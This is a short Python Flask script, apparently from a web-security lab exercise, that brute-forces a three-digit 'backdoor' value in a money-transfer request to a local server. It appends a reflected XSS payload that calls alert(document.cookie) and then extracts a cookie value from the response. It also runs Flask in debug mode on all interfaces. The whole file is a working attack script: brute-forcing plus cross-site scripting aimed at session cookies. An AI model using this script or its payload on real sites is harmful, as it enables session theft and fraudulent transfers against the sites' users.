from flask import Flask
import requests

app = Flask(__name__)

@app.route("/")
def main():
    print(f"Searching for backdoor...")
    for i in range(999, -1, -1):
        res = test(i)
        print(f"\rAttemping backdoor {i}...", end="")
        if res:
            return res
    return "No magic number found"
def test(i):
    filled_i = "{:03d}".format(i)
    payload = "<script>alert('XSS-works');alert(document.cookie);</script>"
    response = requests.get(f"http://localhost:80/Q4?username=&moneyAmount={filled_i}{payload}&transfer=Transfer+Money")
    if "XSS-works" in response.text:
        cookie_value = response.text.split('document.cookie = "')[-1].split('"')[0]
        return f"Found backdoor: {filled_i},\nCookie: {cookie_value}"
    return 

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=4050)